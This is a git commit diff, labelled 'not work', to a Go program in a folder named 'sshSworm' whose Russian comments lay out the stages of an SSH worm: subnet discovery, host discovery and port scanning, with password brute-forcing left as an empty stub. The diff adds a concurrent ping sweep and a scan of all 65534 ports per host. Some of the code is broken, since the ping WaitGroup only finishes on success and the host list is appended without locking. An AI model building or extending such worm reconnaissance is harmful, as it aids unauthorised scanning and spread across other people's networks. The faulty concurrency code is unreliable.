8971dda66bf0692c50576d2891dfa17981f28abb
dreddsa5dies <viktor.vladimirovich.solovev@gmail.com>
2017-07-10 22:02:53 +0300

    not work

--- 13_sshSworm/swarm.go
+++ 13_sshSworm/swarm.go
@@ -1,11 +1,14 @@
 package main
 
 import (
+	"fmt"
+	"io"
 	"log"
 	"net"
 	"os"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 
 	fastping "github.com/tatsushid/go-fastping"
@@ -15,18 +18,46 @@ func main() {
 	// какая подсеть
 	netIP := myNet()
 
-	for _, a := range netIP {
-		addressHosts := strings.TrimRight(a, "0")
-		for i := 1; i < 254; i++ {
-			if pingTarget(addressHosts + strconv.Itoa(i)) {
-				println(addressHosts + strconv.Itoa(i))
-			}
-		}
-	}
-
 	// поиск хостов
+	// TODO: без fastpinga надо делать
+	allHosts := searchHosts(netIP)
+	println(allHosts)
 
-	// сканирование на SSH
+	// сканирование
+	for _, host := range allHosts {
+
+		wg := sync.WaitGroup{}
+
+		c := func(ports int) {
+			conn, err := net.DialTimeout("tcp", host+":"+strconv.Itoa(ports), time.Duration(1)*time.Second)
+			if err == nil {
+				// отправка текста
+				fmt.Fprintf(conn, "HELLO\r\n")
+
+				buf := make([]byte, 0, 4096) // big buffer
+				tmp := make([]byte, 256)     // using small tmo buffer for demonstrating
+				for {
+					n, err := conn.Read(tmp)
+					if err != nil {
+						if err != io.EOF {
+							fmt.Println("read error:", err)
+						}
+						break
+					}
+					buf = append(buf, tmp[:n]...)
+				}
+				conn.Close()
+				fmt.Println(ports, " open")
+			}
+			wg.Done()
+		}
+
+		wg.Add(65534)
+		for i := 0; i < 65534; i++ {
+			go c(i)
+		}
+		wg.Wait()
+	}
 
 	// подбор пароля
 
@@ -78,4 +109,30 @@ func pingTarget(ipTarget string) bool {
 	}
 
 	return target
+}
+
+// поиск хостов
+func searchHosts(netIP []string) []string {
+	allHosts := make([]string, 0)
+
+	for _, a := range netIP {
+		addressHosts := strings.TrimRight(a, "0")
+
+		wg := sync.WaitGroup{}
+
+		p := func(hostPing string) {
+			if pingTarget(hostPing) {
+				allHosts = append(allHosts, hostPing)
+				wg.Done()
+			}
+		}
+
+		wg.Add(253)
+		for i := 1; i < 254; i++ {
+			go p(addressHosts + strconv.Itoa(i))
+		}
+		wg.Wait()
+	}
+
+	return allHosts
 }
